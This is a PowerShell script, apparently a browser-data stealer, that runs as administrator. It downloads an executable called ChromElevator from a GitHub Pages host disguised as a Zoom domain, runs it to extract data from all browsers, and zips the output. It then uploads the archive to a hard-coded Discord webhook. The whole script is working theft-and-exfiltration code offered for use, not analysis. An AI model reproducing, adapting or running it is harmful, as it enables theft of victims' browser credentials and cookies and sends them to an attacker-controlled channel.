# ChromElevator Extraction + Discord Upload Script
# Run this in PowerShell as Administrator
# No need to manually transfer the .exe file!

# Suppress warnings and confirmations
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ===== CONFIGURATION =====
$CHROME_ELEVATOR_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/chromelevator_x64.exe"
$CHROME_ELEVATOR_PATH = ".\chromelevator_x64.exe"
$OUTPUT_DIR = ".\output"
$ZIP_OUTPUT = ".\extracted_data_$(Get-Date -Format 'yyyy-MM-dd_HHmmss').zip"
$DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1547028467466641540/29SPxtBUajxVLWn1qCLikMCK3SUckLDnQNhGFJb4s-vffcBGM0advx09nyfH1wrOERUX"

# ===== STEP 0: Download ChromElevator if not present =====
if (-not (Test-Path $CHROME_ELEVATOR_PATH)) {
    Write-Host "[*] Downloading ChromElevator from GitHub..." -ForegroundColor Cyan
    Write-Host "[*] Source: $CHROME_ELEVATOR_URL" -ForegroundColor Cyan
    
    try {
        Invoke-WebRequest -Uri $CHROME_ELEVATOR_URL -OutFile $CHROME_ELEVATOR_PATH -UseBasicParsing -ErrorAction Stop
        Write-Host "[+] Download complete: $CHROME_ELEVATOR_PATH" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to download ChromElevator:" -ForegroundColor Red
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[*] Make sure you have internet connection and the URL is correct" -ForegroundColor Yellow
        exit 1
    }
} else {
    Write-Host "[+] ChromElevator already downloaded: $CHROME_ELEVATOR_PATH" -ForegroundColor Green
}

# ===== STEP 1: Run ChromElevator =====
Write-Host "[*] Starting ChromElevator extraction..." -ForegroundColor Cyan
& $CHROME_ELEVATOR_PATH -k all

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] ChromElevator failed to run. Check permissions and paths." -ForegroundColor Red
    exit 1
}

# Wait for extraction to complete
Start-Sleep -Seconds 2

# ===== STEP 2: Check if output exists =====
if (-not (Test-Path $OUTPUT_DIR)) {
    Write-Host "[!] Output directory not found!" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Output directory found: $OUTPUT_DIR" -ForegroundColor Green

# ===== STEP 3: Create ZIP file =====
Write-Host "[*] Zipping output directory..." -ForegroundColor Cyan

# Remove old zip if exists
if (Test-Path $ZIP_OUTPUT) {
    Remove-Item $ZIP_OUTPUT -Force
}

# Create ZIP using PowerShell (built-in, no external tools needed)
Compress-Archive -Path $OUTPUT_DIR -DestinationPath $ZIP_OUTPUT -Force

$ZIP_SIZE = (Get-Item $ZIP_OUTPUT).Length / 1MB
Write-Host "[+] ZIP created: $ZIP_OUTPUT (Size: $([Math]::Round($ZIP_SIZE, 2)) MB)" -ForegroundColor Green

# ===== STEP 4: Send to Discord =====
if ($DISCORD_WEBHOOK_URL -eq "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    Write-Host "[!] Discord webhook URL not configured!" -ForegroundColor Yellow
    Write-Host "[!] Skipping Discord upload." -ForegroundColor Yellow
    Write-Host "[*] To enable, replace 'YOUR_DISCORD_WEBHOOK_URL_HERE' in this script" -ForegroundColor Yellow
    exit 0
}

Write-Host "[*] Uploading to Discord..." -ForegroundColor Cyan

try {
    $filePath = (Resolve-Path $ZIP_OUTPUT).Path
    $fileName = [System.IO.Path]::GetFileName($filePath)
    
    # Read file as bytes
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    
    # Create form data
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    $body = (
        "--{0}{1}" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"{2}`"{1}" +
        "Content-Type: application/zip{1}{1}" +
        "{1}--{0}--{1}"
    ) -f $boundary, $LF, $fileName
    
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
    $memoryStream = New-Object System.IO.MemoryStream
    
    # Write start boundary
    $startBoundary = [System.Text.Encoding]::UTF8.GetBytes(("--{0}{1}" -f $boundary, $LF))
    $memoryStream.Write($startBoundary, 0, $startBoundary.Length)
    
    # Write file header
    $fileHeader = [System.Text.Encoding]::UTF8.GetBytes(("Content-Disposition: form-data; name=`"file`"; filename=`"{0}`"{1}Content-Type: application/zip{1}{1}" -f $fileName, $LF))
    $memoryStream.Write($fileHeader, 0, $fileHeader.Length)
    
    # Write file content
    $memoryStream.Write($fileBytes, 0, $fileBytes.Length)
    
    # Write end boundary
    $endBoundary = [System.Text.Encoding]::UTF8.GetBytes(("{0}--{1}--{0}" -f $LF, $boundary))
    $memoryStream.Write($endBoundary, 0, $endBoundary.Length)
    
    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)
    
    # Send to Discord
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }
    
    $response = Invoke-WebRequest -Uri $DISCORD_WEBHOOK_URL `
        -Method Post `
        -Body $memoryStream.ToArray() `
        -Headers $headers `
        -UseBasicParsing `
        -ErrorAction Stop
    
    Write-Host "[+] File uploaded to Discord successfully!" -ForegroundColor Green
    Write-Host "[+] Response: $($response.StatusCode)" -ForegroundColor Green
    
}
catch {
    Write-Host "[!] Failed to upload to Discord:" -ForegroundColor Red
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[*] ZIP file saved locally at: $filePath" -ForegroundColor Yellow
}

# ===== CLEANUP (Optional) =====
Write-Host "[*] Extraction complete!" -ForegroundColor Cyan
Write-Host "[*] Local ZIP: $ZIP_OUTPUT" -ForegroundColor Cyan
Write-Host "[*] You can delete the 'output' folder to save space" -ForegroundColor Cyan